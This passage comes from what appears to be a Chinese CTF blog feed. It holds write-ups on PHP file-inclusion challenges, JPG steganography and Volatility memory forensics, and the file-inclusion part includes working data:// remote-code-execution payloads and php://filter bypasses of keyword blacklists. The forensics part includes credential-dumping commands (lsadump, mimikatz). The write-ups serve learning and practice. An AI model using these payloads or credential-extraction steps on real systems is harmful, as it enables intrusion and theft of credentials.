可能会影响include包含的结果</li><li>某些情况下，unicode编码不同但是字形相近的字符有同一个效果</li></ul><p>这里也就是指的是上述的远程文件绕过技巧</p><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>几乎是最常用的方法，条件是 <code>magic_quotes_gpc</code> 关闭，而且php版本小于5.3.4。</p><p>这里先了解一下，后面在出相关讲解和例题分析</p><p>以下例题只涉及上述部分知识，等以后做到相关其他知识的题在补充进来</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a><strong>Web_php_include</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>strstr()：</p><p>搜索字符串在另一个字符串中是否存在，如果是，返回字符串及剩余部分，否则返回false。</p><p>分析代码可知程序过滤掉了page&#x3D;php:&#x2F;&#x2F;</p><p>可以使用data伪协议</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?page=data:<span class="comment">//text/plain,&lt;?php system(&quot;ls&quot;)?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/1721784913661-2.png" alt="img"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?page=data:<span class="comment">//text/plain,&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;)?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/1721784913661-3.png" alt="img"></p><p><img src="/img/1721784913661-4.png" alt="img"></p><h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a><strong>[极客大挑战 2019]Secret File</strong></h3><p>考察知识点：<strong>bp<strong><strong>抓包</strong></strong>，文件包含-伪协议</strong></p><p>查看页面源代码，发现</p><p><img src="/img/1721784913661-5.png" alt="img"></p><p>进去看看</p><p><img src="/img/1721784913661-6.png" alt="img"></p><p>仍然没啥用，再次查看源代码，发现action.php,进去看看直接到了end页面，猜测反应太快，试试抓包</p><p>发现secr3t.php</p><p><img src="/img/1721784913662-7.png" alt="img"></p><p>之后为</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>代码解析</p><p>如果<code>$file</code>包含”..&#x2F;“、”tp”、”input”或”data”（不区分大小写），则脚本会输出”Oh no!”并终止执行。</p><p>禁用了一部分伪协议的关键词，那么就用php:&#x2F;&#x2F;filter伪协议</p><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p><img src="/img/1721784913662-8.png" alt="img"></p><p>base解密</p><p>flag{3dbc981c-5d2a-4f52-895b-86ae37448724}</p><h3 id="GDOUCTF-2023-泄露的伪装"><a href="#GDOUCTF-2023-泄露的伪装" class="headerlink" title="[GDOUCTF 2023]泄露的伪装"></a>[GDOUCTF 2023]泄露的伪装</h3><p>考点：<strong>目录扫描，data伪协议使用</strong></p><p><img src="/img/1721784913662-9.png" alt="img"></p><p>你看不见我但是你又能看见我，应该是被隐藏了，用dir扫一下目录</p><p><img src="/img/1721784913662-10.png" alt="img"></p><p>发现&#x2F;test.txt和&#x2F;<a href="http://www.rar/">www.rar</a></p><p>先进入&#x2F;test.txt</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cxk&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cxk</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cxk&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$cxk</span>)==<span class="string">&quot;ctrl&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;娲楁礂鐫″惂&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nononoononoonono&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>下载rar发现</p><p><img src="/img/1721784913662-11.png" alt="img"></p><p>进入&#x2F;orzorz.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cxk&#x27;</span>]))&#123; </span><br><span class="line">    <span class="variable">$cxk</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cxk&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$cxk</span>)==<span class="string">&quot;ctrl&quot;</span>)&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>; </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;洗洗睡吧&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nononoononoonono&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span>nononoononoonono</span><br></pre></td></tr></table></figure><p>和test.txt相似</p><p>代码分析：检查是否存在名为 ‘cxk’ 的 GET 参数，赋值给$cxk</p><p>使用 file_get_contents($cxk) 函数读取 $cxk 变量中指定的 URL 或文件的内容</p><p>如果读取的内容等于字符串 “ctrl”，则输出变量 $flag 的值</p><p>file_get_content()函数配合php伪协议来获取flag</p><p>这里采用data协议，构造payload为</p><p>?cxk&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,ctrl</p><p>?cxk&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,Y3RybA&#x3D;&#x3D;</p><p><img src="/img/1721784913662-12.png" alt="img"></p><p>NSSCTF{a1475d2b-f68b-4eb0-aa97-3d998ac90e1a}</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>隐写一</title>
      <link href="/2024/07/23/%E9%9A%90%E5%86%99%E4%B8%80/"/>
      <url>/2024/07/23/%E9%9A%90%E5%86%99%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2 id="jpg类隐写"><a href="#jpg类隐写" class="headerlink" title="jpg类隐写"></a>jpg类隐写</h2><h3 id="jphide隐写"><a href="#jphide隐写" class="headerlink" title="jphide隐写"></a>jphide隐写</h3><p>010里发现假的flag</p><p><img src="/img/1721699493768-127.png" alt="img"></p><p>5a+G56CBMTIz</p><p><img src="/img/1721699493768-128.png" alt="img"></p><p>密码123，有密码的jpg隐写，steghide,JPHS.</p><p>用stegdetect检查一下，发现是jphide隐写</p><p><img src="/img/1721699493768-129.png" alt="img"></p><p>JPHS</p><p><img src="/img/1721699493768-130.png" alt="img"></p><p>FSCTF{huang_duduanwangu}</p><h3 id="outguss隐写"><a href="#outguss隐写" class="headerlink" title="outguss隐写"></a>outguss隐写</h3><p><img src="/img/1721699493768-131.jpeg" alt="img"></p><p>查看属性：<strong>公正民主公正文明公正和谐</strong></p><p>社会主义核心价值观解密</p><p>密码为abc</p><p>采用outguess解密</p><p>outguess安装                                                              <a href="https://blog.csdn.net/m0_58199719/article/details/123692511?spm=1001.2014.3001.5501">https://blog.csdn.net/m0_58199719/article/details/123692511?spm=1001.2014.3001.5501</a></p><p><img src="/img/1721699493768-132.png" alt="img"></p><p>outguess使用</p><p>注意：<strong>outguess -k ‘密码’ -r 文件名 flag.txt</strong></p><p>ACTF{gue33_Gu3Ss!2020}</p><h3 id="F5-steganography隐写"><a href="#F5-steganography隐写" class="headerlink" title="F5-steganography隐写"></a>F5-steganography隐写</h3><p>刷新过的图片</p><p><img src="/img/1721699493768-133.jpeg" alt="img"></p><p>010里面没有有效信息，binwalk无结果，这题涉及F5-steganography隐写</p><p>工具安装参考博客   <a href="https://blog.csdn.net/weixin_30627381/article/details/99264894">https://blog.csdn.net/weixin_30627381/article/details/99264894</a></p><p><img src="/img/1721699493768-134.png" alt="img"></p><p>进入F5-steganography-master文件夹，在空白处 ctrl+shift+鼠标右键-&gt;在此处打开命令窗口</p><p>在cmd中输入命令：</p><p>java Extract 文件的绝对路径 -p 密码</p><p><strong>注意：将图片放入F5-steganography-master目录中，会生成一个output.txt</strong></p><p><img src="/img/1721699493768-135.png" alt="img"></p><p>开头为PK,将txt改为zip即可出现flag</p><p>flag{96efd0a2037d06f34199e921079778ee}</p><h3 id="steghide隐写"><a href="#steghide隐写" class="headerlink" title="steghide隐写"></a>steghide隐写</h3><p>根据题目提示原神七七在哪里</p><p><img src="/img/1721699493768-136.png" alt="img"></p><p>密码为liyue</p><p>kali里用steghide里查看</p><p>命令是steghide extract -sf 文件名 -p 密码</p><p><img src="/img/1721699493768-137.png" alt="img"></p><p><img src="/img/1721699493768-138.png" alt="img"></p><p>发现零宽字符隐写</p><p><img src="/img/1721699493768-139.png" alt="img"></p><p>这是一个错误的flag，但是可能是字母的大小不一样，编写脚本，得出所有大小写的可能性，并生成dic.txt.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_character_combinations</span>(<span class="params">word</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;获取单词中每个字符的大小写组合可能性&quot;&quot;&quot;</span></span><br><span class="line">    character_combinations = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> word:</span><br><span class="line">        combinations = <span class="built_in">list</span>(<span class="built_in">set</span>([<span class="string">&quot;&quot;</span>.join(comb) <span class="keyword">for</span> comb <span class="keyword">in</span> itertools.product(*<span class="built_in">zip</span>(char.lower(), char.upper()))]))</span><br><span class="line">        character_combinations[char] = combinations</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> character_combinations</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_variants</span>(<span class="params">word, character_combinations</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;生成变形字符串&quot;&quot;&quot;</span></span><br><span class="line">    variants = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> combination <span class="keyword">in</span> itertools.product(*[character_combinations[char] <span class="keyword">for</span> char <span class="keyword">in</span> word]):</span><br><span class="line">        variant = <span class="string">&quot;&quot;</span>.join(combination)</span><br><span class="line">        <span class="keyword">if</span> variant != word:</span><br><span class="line">            variants.add(variant)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> variants</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_to_file</span>(<span class="params">variants, filename</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;将变形字符串保存到文件中&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> variant <span class="keyword">in</span> variants:</span><br><span class="line">            file.write(<span class="string">f&quot;flag&#123;&#123;<span class="subst">&#123;variant&#125;</span>&#125;&#125;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 单词 JPeG_Is_IntErEsting</span></span><br><span class="line">word = <span class="string">&quot;JPeG_Is_IntErEsting&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取字符大小写组合可能性</span></span><br><span class="line">character_combinations = get_character_combinations(word)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成变形字符串</span></span><br><span class="line">variants = generate_variants(word, character_combinations)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存到文件</span></span><br><span class="line">save_to_file(variants, <span class="string">&quot;dic.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;保存成功！&quot;</span>)</span><br></pre></td></tr></table></figure><p>进行字典爆破</p><p><img src="/img/1721699493768-140.png" alt="img"></p><p>得到密码flag{JPeG_Is_IntErEsting}</p><p>kali里zsteg发现base，zsteg主要查看lsb,,这里的base不全，继续返回stegsolve里看msb</p><p><img src="/img/1721699493768-141.png" alt="img"></p><p><img src="/img/1721699493769-142.png" alt="img"></p><p>将HYNUCTF{This_is_a_fake_flag}删掉</p><p><img src="/img/1721699493769-143.png" alt="img"></p><p>得到HYNUCTF{RgB_or_Lsb_may_Y0u_knnoww?}</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内存取证</title>
      <link href="/2024/07/22/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
      <url>/2024/07/22/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><h3 id="volatility基础命令"><a href="#volatility基础命令" class="headerlink" title="volatility基础命令"></a>volatility基础命令</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">imageinfo：显示目标镜像的摘要信息，这常常是第一步，获取内存的操作系统类型及版本，之后可以在 –profile 中带上对应的操作系统，后续操作都要带上这一参数</span><br><span class="line"></span><br><span class="line">pslist：该插件列举出系统进程，但它不能检测到隐藏或者解链的进程，psscan可以</span><br><span class="line"></span><br><span class="line">pstree：以树的形式查看进程列表，和pslist一样，也无法检测隐藏或解链的进程</span><br><span class="line"></span><br><span class="line">psscan：可以找到先前已终止(不活动)的进程以及被rootkit隐藏或解链的进程</span><br><span class="line"></span><br><span class="line">cmdscan：可用于查看终端记录</span><br><span class="line"></span><br><span class="line">notepad：查看当前展示的 notepad 文本（–profile=winxp啥的低版本可以，win7的不行，可以尝试使用editbox）</span><br><span class="line"></span><br><span class="line">filescan：扫描所有的文件列表</span><br><span class="line"></span><br><span class="line">linux配合 grep 命令进行相关字符定向扫描，如：grep flag、grep -E ‘png|jpg|gif|<span class="built_in">zip</span>|rar|7z|pdf|txt|doc’</span><br><span class="line"></span><br><span class="line">dumpfiles：导出某一文件(指定虚拟地址)</span><br><span class="line"></span><br><span class="line">需要指定偏移量 -Q 和输出目录 -D</span><br><span class="line"></span><br><span class="line">mendump：提取出指定进程，常用foremost 来分离里面的文件</span><br><span class="line"></span><br><span class="line">需要指定进程-p [pid] 和输出目录 -D</span><br><span class="line"></span><br><span class="line">editbox：显示有关编辑控件（曾经编辑过的内容）的信息</span><br><span class="line"></span><br><span class="line">screenshot：保存基于GDI窗口的伪截屏</span><br><span class="line"></span><br><span class="line">clipboard：查看剪贴板信息</span><br><span class="line"></span><br><span class="line">iehistory：检索IE浏览器历史记录</span><br><span class="line"></span><br><span class="line">systeminfo：显示关于计算机及其操作系统的详细配置信息（插件）</span><br><span class="line"></span><br><span class="line">hashdump：查看当前操作系统中的 password <span class="built_in">hash</span>，例如 Windows 的 SAM 文件内容(mimikatz插件可以获取系统明文密码)</span><br><span class="line"></span><br><span class="line">mftparser：恢复被删除的文件</span><br><span class="line"></span><br><span class="line">svcscan：扫描 Windows 的服务</span><br><span class="line"></span><br><span class="line">connscan：查看网络连接</span><br><span class="line"></span><br><span class="line">envars：查看环境变量</span><br><span class="line"></span><br><span class="line">dlllist: 列出某一进程加载的所有dll文件</span><br><span class="line"></span><br><span class="line">hivelist: 列出所有的注册表项及其虚拟地址和物理地址</span><br><span class="line"></span><br><span class="line">timeliner: 将所有操作系统事件以时间线的方式展开</span><br></pre></td></tr></table></figure><p>自己总结</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">一：总结一下上面题目所用到的命令</span><br><span class="line">查看镜像</span><br><span class="line">vol.py -f Target.vmem imageinfo </span><br><span class="line">提取本地存储的凭证信息</span><br><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 lsadump</span><br><span class="line">扫描含CTF的文件</span><br><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 filescan | grep CTF</span><br><span class="line">扫描多个文件</span><br><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 filescan | grep -E <span class="string">&quot;jpg|png|zip|rar|gif&quot;</span></span><br><span class="line">提取文件</span><br><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 dumpfiles -Q <span class="number">0x000000007d8c7d10</span> -D <span class="number">1</span></span><br><span class="line">查看进程</span><br><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 pslist</span><br><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 pstree</span><br><span class="line">扫描终端</span><br><span class="line">vol.py -f file.raw --profile=WinXPSP2x86 cmdscan</span><br><span class="line">查看浏览记录</span><br><span class="line">vol.py -f file.raw --profile=WinXPSP2x86 iehistory</span><br><span class="line">扫描其IP地址</span><br><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 netscan | grep <span class="string">&quot;LunarMS.exe&quot;</span></span><br><span class="line">查看剪切板信息</span><br><span class="line">vol.py -f OtterCTF.vmem --profile=Win7SP1x64 clipboard</span><br></pre></td></tr></table></figure><h3 id="陇剑杯-2021-内存分析（问1）"><a href="#陇剑杯-2021-内存分析（问1）" class="headerlink" title="[陇剑杯 2021]内存分析（问1）"></a>[陇剑杯 2021]内存分析（问1）</h3><p>查看镜像</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vol.py -f Target.vmem imageinfo </span><br></pre></td></tr></table></figure><p><img src="/img/1721634933786-28.png" alt="img"></p><p>1：没有安装pycryptodome，kali里自带python3的环境，有python2的环境却没有pip2</p><p>这里得在python2的环境下使用pip2来安装pycryptodome</p><p>一：下载get-pip.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/pip/<span class="number">2.7</span>/get-pip.py </span><br></pre></td></tr></table></figure><p>二：python执行get-pip.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudo python2 get-pip.py</span><br></pre></td></tr></table></figure><p>三：查看pip2的版本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip2 -V</span><br></pre></td></tr></table></figure><p><img src="/img/1721634933787-29.png" alt="img"></p><p>四：安装pycryptodome</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip2 install pycryptodome</span><br></pre></td></tr></table></figure><p><img src="/img/1721634933787-30.png" alt="img"></p><p><img src="/img/1721634933787-31.png" alt="img"></p><p>2：可以找到Win7SP1x64，通过lsadump插件将被调用以提取本地存储的凭证信息</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 lsadump</span><br></pre></td></tr></table></figure><p><img src="/img/1721634933787-32.png" alt="img"></p><p>方法二：使用mimikatz插件来解</p><p>1:下载mimikatz.py,将其移至volatility的plugins,注意这里不能直接复制粘贴进去，得使用命令</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudo mv mimikatz.py /home/kali/Desktop/volatility/plugins/</span><br></pre></td></tr></table></figure><p>2：安装construct</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install construct</span><br></pre></td></tr></table></figure><p>嘶，我没装上，嘿嘿，不过用处和lsadump插件差不多</p><h3 id="陇剑杯-2021-内存分析（问2）"><a href="#陇剑杯-2021-内存分析（问2）" class="headerlink" title="[陇剑杯 2021]内存分析（问2）"></a>[陇剑杯 2021]内存分析（问2）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">网管小王制作了一个虚拟机文件，让您来分析后作答：</span><br><span class="line">虚拟机中有一个某品牌手机的备份文件，文件里的图片里的字符串为_____________。（解题过程中需要用到上一题答案中flag&#123;&#125;内的内容进行处理。本题的格式也是flag&#123;xxx&#125;，含有空格，提交时不要去掉）。</span><br></pre></td></tr></table></figure><p>试着搜索CTF的文件名，可以发现HUAWEI P40</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 filescan | grep CTF</span><br></pre></td></tr></table></figure><p><img src="/img/1721634933787-33.png" alt="img"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 filescan | grep HUAWEI</span><br></pre></td></tr></table></figure><p><img src="/img/1721634933787-34.png" alt="img"></p><p>导出第一个</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vol.py -f Target.vmem --profile=Win7SP1x64 dumpfiles -Q <span class="number">0x000000007d8c7d10</span> -D <span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/img/1721634933787-35.png" alt="img"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">unzip file.<span class="literal">None</span><span class="number">.0</span>xfffffa80037e0af0.dat</span><br></pre></td></tr></table></figure><p><img src="/img/1721634933787-36.png" alt="img"></p><p>解压之后我们可以发现多了一个文件夹，并发现一个images0.tar.enc文件，此文件为华为加密文件，在网上下载相应的解密脚本即可</p><p>下载地址：<a href="https://github.com/RealityNet/kobackupdec">https://github.com/RealityNet/kobackupdec</a></p><p>这里需要用到的密码为第一题所需的密码，文件夹为刚才解压出来的文件夹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 kobackupdec.py -vvv W31C0M3_T0_THiS_34SY_F0R3NSiCX <span class="string">&quot;/home/kali/Desktop/HUAWEI P40_2021-aa-bb xx.yy.zz&quot;</span> /home/kali/Desktop/<span class="number">2</span></span><br></pre></td></tr></table></figure><p><img src="/img/1721634933787-37.png" alt="img"></p><p>在所生成的文件2里找到相应的压缩包，得到flag</p><p><img src="/img/1721634933787-38.png" alt="img"></p><h3 id="羊城杯-2021-Baby-Forenisc"><a href="#羊城杯-2021-Baby-Forenisc" class="headerlink" title="[羊城杯 2021]Baby_Forenisc"></a>[羊城杯 2021]Baby_Forenisc</h3><p>查看镜像的系统版本</p><p><img src="/img/1721634933787-39.png" alt="img"></p><p>查看进程</p><p><img src="/img/1721634933787-40.png" alt="img"></p><p>查看cmd命令</p><p><img src="/img/1721634933787-41.png" alt="img"></p><p>使用git命令上传了一些文件，既然上传了一些文件，我们使用grep来特定找出相应的文件</p><p><img src="/img/1721634933787-42.png" alt="img"></p><p>实在不放心可以使用file命令来查看其类型</p><p><img src="/img/1721634933788-43.png" alt="img"></p><p>可以发现其为SSH私钥</p><p>使用dumpfiles将其ssh.txt导出</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vol.py -f BIODOG-7711E93C-<span class="number">20210908</span>-<span class="number">053022.</span>raw --profile=WinXPSP2x86 dumpfiles -Q <span class="number">0x00000000020bf6a0</span> -D <span class="number">2</span></span><br></pre></td></tr></table></figure><p><img src="/img/1721634933788-44.png" alt="img"></p><p>base64对其进行编码和解码来提取.dat的数据</p><p><img src="/img/1721634933788-45.png" alt="img"></p><p>这里发现qq邮箱</p><p><img src="/img/1721634933788-46.png" alt="img"></p><p>github上搜索其qq邮箱</p><p><img src="/img/1721634933788-47.png" alt="img"></p><p><img src="/img/1721634933788-48.png" alt="img"></p><p>下载其_APP_,010里找到</p><p><img src="/img/1721634933788-49.png" alt="img"></p><p>base64解码</p><p>SangFor{S0_3azy_2_crack_noob_player}</p><h3 id="鹏城杯-2022-简单取证"><a href="#鹏城杯-2022-简单取证" class="headerlink" title="[鹏城杯 2022]简单取证"></a>[鹏城杯 2022]简单取证</h3><p>查看镜像，找到WinXPSP2x86</p><p><img src="/img/1721634933788-50.png" alt="img"></p><p>发现一张secret.jpg,使用dump提取出来</p><p><img src="/img/1721634933788-51.png" alt="img"></p><p>又或者是直接查看其浏览记录vol.py -f file.raw –profile&#x3D;WinXPSP2x86 iehistory</p><p><img src="/img/1721634933788-52.png" alt="img"></p><p><img src="/img/1721634933788-53.png" alt="img"></p><p>找到jpg图片vol.py -f file.raw –profile&#x3D;WinXPSP2x86 filescan | grep secret.jpg</p><p><img src="/img/1721634933788-54.png" alt="img"></p><p>提取jpg图片vol.py -f file.raw –profile&#x3D;WinXPSP2x86 dumpfiles -Q 0x0000000002325028 -D 3</p><p><img src="/img/1721634933789-55.png" alt="img"></p><p><img src="/img/1721634933789-56.png" alt="img"></p><p>注意：这里导出的并不是jpg图片，而是其数据，可以发现是base64编码，对其进行base64解码，可以发现其是一个压缩包的逆序数据。</p><p>可以使用base64 -d file.None.0x81fc6610.dat | rev ,嘶，这个直接卡死，转半天没转出来</p><p><img src="/img/1721634933789-57.png" alt="img"></p><p>在厨师里进行解密，保存为zip,嘶，这里转化有点问题，找不到flag.txt</p><p><img src="/img/1721634933789-58.png" alt="img"></p><p>直接用脚本进行转化.这个可以</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.jpg&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    r = f.read()</span><br><span class="line"></span><br><span class="line">lst = <span class="built_in">list</span>(base64.b64decode(r))</span><br><span class="line">lst.reverse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">        s = struct.pack(<span class="string">&#x27;B&#x27;</span>, i)</span><br><span class="line">        f.write(s)</span><br></pre></td></tr></table></figure><p>vol.py -f file.raw –profile&#x3D;WinXPSP2x86 cmdscan</p><p><img src="/img/1721634933789-59.png" alt="img"></p><p>password:62b041223bb9a</p><p>打开压缩包，类似坐标，绘制二维码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">350</span>, <span class="number">350</span>), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    r = f.read()</span><br><span class="line"></span><br><span class="line">lst = r.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    x = <span class="built_in">int</span>(i.split(<span class="string">&quot; &quot;</span>)[<span class="number">0</span>])</span><br><span class="line">    y = <span class="built_in">int</span>(i.split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    im.putpixel((x, y), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line"></span><br><span class="line">im.save(<span 